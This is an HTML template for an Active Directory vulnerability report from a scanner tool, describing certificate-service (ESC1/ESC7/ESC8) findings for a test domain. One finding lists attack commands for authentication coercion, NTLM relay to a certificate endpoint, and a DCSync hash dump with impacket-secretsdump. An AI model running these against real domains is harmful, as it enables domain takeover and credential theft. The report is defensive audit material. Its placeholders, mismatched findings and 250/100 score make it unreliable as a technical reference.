<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>test.local Vulnerability Report</title>
    <link rel="stylesheet" href="styles.css">
</head>

<body>
    <div class="banner">
        <pre class="logo">
    /\   |  __ \ / ____|                                
   /  \  | |  | | (___   ___ __ _ _ __  _ __   ___ _ __ 
  / /\ \ | |  | |\___ \ / __/ _` | '_ \| '_ \ / _ \ '__|
 / ____ \| |__| |____) | (_| (_| | | | | | | |  __/ |   
/_/    \_\_____/|_____/ \___\__,_|_| |_|_| |_|\___|_|   

[+] Jack G (@rootjack) https://github.com/rootjaxk/ADScanner
  </pre>
    </div>
    <div class="main-header">Domain vulnerability report for test.local</div>

    <!-- Executive summary section -->
    <div class="summary">
        <!-- Left section for the tables -->
        <div class="left-section">
            <div class="table-container">
                <h3>Total risk score</h3>
                <p>test.local = 250/100</p>
                <table class="summary-table">
                    <thead>
                        <tr>
                            <th>Category</th>
                            <th>Score</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>PKI</td>
                            <td>150</td>
                        </tr>
                    </tbody>
                </table>
            </div>
            <div class="table-container">
                <h3>Details when ran</h3>
                <table class="summary-table">
                    <thead>
                        <tr>
                            <th>User</th>
                            <th>Host</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>test\jack</td>
                            <td>DC.test.local</td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>
        <!-- Right section for the executive summary -->
        <div class="executive-summary">
            <h2>Executive Summary (GPT to contextualize)</h2>
            <p>ADscanner was commissioned to perform a vulnerability assessment against the test.local Active Directory
                domain to ensure correct security configuration and operation of the Directory.
                The audit indicates that the security of the Active Directory is reduced by the X, Y & Z. a number of
                misconfigurations significantly increases the attack surface of Active Directory, and therefore the
                network could be exploited by a determined attacker deploying ransomware and malware.</p>
            <p>The below table summarises the number and criticality of the issues found during the audit:</p>
        </div>
    </div>
    
    <!-- Executive prioritisation section -->
    <div class="risk-summary-container">
        <div class="risk-summary-heading">
            <h2>Risk Prioritisation Summary</h2>
            <p>The table below summarizes the number and criticality of findings in order of decreasing risk. Full
                details can be found by clicking on each vulnerability which will take you to the relevant technical
                section.</p>
        </div>
        <table class="risk-prioritisation-summary">
            <thead>
                <tr>
                    <th class="risk-column">Risk</th>
                    <th class="technique-column">Technique</a></th>
                    <th class="category-column">Category</th>
                    <th class="score-column">Score</th>
                </tr>
            </thead>
            <tbody>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#esc1"><u>ESC1</u></a></td>
                    <td>PKI</td>
                    <td>50</td>
                </tr>
                <tr class="high">
                    <td>High</td>   
                    <td><a href="#esc1"><u>ESC1</u></a></td>
                    <td>PKI</td>
                    <td>35</td>
                </tr>
                <tr class="medium">
                    <td>Medium</td>
                    <td><a href="#esc1"><u>ESC7</u></a></td>
                    <td>PKI</td>
                    <td>20</td>
                </tr>
                <tr class="low">
                    <td>Low</td>
                    <td><a href="#esc1"><u>ESC8</u></a></td>
                    <td>PKI</td>
                    <td>10</td>
                </tr>
                <tr class="information">
                    <td>Informational</td>
                    <td><a href="#esc1"><u>ESC8</u></a></td>
                    <td>PKI</td>
                    <td>1</td>
                </tr>
            </tbody>
        </table>
    </div>

    <!-- Technical section -->
    <div class="main-header">Technical section</div>
    <div class="finding-header">Domain info</div>
    <p></p>
    <div class="finding-header">PKI</div>

    <!--Technical table-->
    <div class="finding-container">
        <table>
            <thead>
                <tr>
                    <th class="table-header">Technique</th>
                    <th class="table-header">Risk</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td class="toggle" id="esc1"><u>ESC1</u></td>
                    <td class="finding-riskcritical">Critical</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low privileged user can enroll in certificate template for authentication
                                            and supply an arbitrary SAN</td>
                                        <td>T-15940</td>
                                        <td>+50</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td>PScustomobject info</td>
                                        <td>
                                            <p>Enrolling in this certificate template allows low privileged users to
                                                escalate their privileges to domain administrator by using a simple
                                                python script</p>
                                            <p><u>Links to further information</u></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Coercing machine authentication back to the attacking machine (192.168.10.130) can be done with printerbug.py or dfscoerce.py.</p>
                                                    <p>python3 printerbug.py test:'Password123'@192.168.10.141 192.168.10.130</p>
                                                    <p>python3 dfscoerece.py -u test -p 'Password123!' -d test.local 192.168.10.130 192.168.18.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/ESC8/ESC-8.png" alt="Image Description">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. Authentication is then relayed to an unsecured certificate endpoint to obtain a pfx certificate for the domain controller. This is then used to replicate the behavior of a domain controller and replicate the contents of NTDS.dit via a DCSync.</p>
                                                    <p>python3 entry.py relay -target 'http://192.168.10.141' -template DomainController</p>
                                                    <p>python3 entry.py auth -pfx 'dc.pfx' -dc-ip 192.168.10.141</p>
                                                    <p>impacket-secretsdump 'dc$'@192.168.10.141 -hashes :xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/ESC8/ESC8-1.png" alt="Image Description">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove the ability for users to supply an arbitrary SAN in the
                                                certificate template or restrict who can enroll within the template to
                                                privileged users only</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td class="toggle"><u>ESC7</u></td>
                    <td class="finding-riskhigh">High</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <p>Full finding info here...</p>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td class="toggle"><u>ESC8</u></td>
                    <td class="finding-riskmedium">Medium</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <p>Full finding info here...</p>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td class="toggle"><u>ESC8</u></td>
                    <td class="finding-risklow">Low</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <p>Full finding info here...</p>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td class="toggle"><u>ESC8</u></td>
                    <td class="finding-riskinformational">Informational</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <p>Full finding info here...</p>
                        </div>
                    </td>
                </tr>
            </tbody>
        </table>
    </div>
    <div class="finding-header">Kerberos</div>
    <p></p>

    <div class="finding-header">ACLs</div>
    <p></p>

    <div class="finding-header">RBAC</div>
    <p></p>

    <div class="finding-header">Passwords</div>
    <p></p>

    <div class="finding-header">MISC</div>
    <p></p>

    <div class="finding-header">Legacy</div>
    <p></p>

    <div class="main-header">Disclosure and next steps</div>
    <p>ADScanner is intended for use on authorised systems only. Users must obtain explicit consent from system owners
        before using the tool on any network or actions could lead to serious legal repercussions.
        The creator is not responsible for any resulting damages or losses</p>
    <p>Once read through the report follow the remediation steps, then rerun the scanner on a periodic basis to see the
        risks score decrease!</p>

    <!-- js to drop down each finding-->
    <script>
        // Get all the rows with class "toggle"
        var toggles = document.querySelectorAll('.toggle');

        // Add event listener to each toggle row
        toggles.forEach(function (toggle) {
            toggle.addEventListener('click', function () {
                // Toggle the visibility of the next sibling element with class "finding"
                var finding = this.parentNode.nextElementSibling;
                finding.style.display = (finding.style.display === 'table-row') ? 'none' : 'table-row';
            });
        });
    </script>
</body>

</html>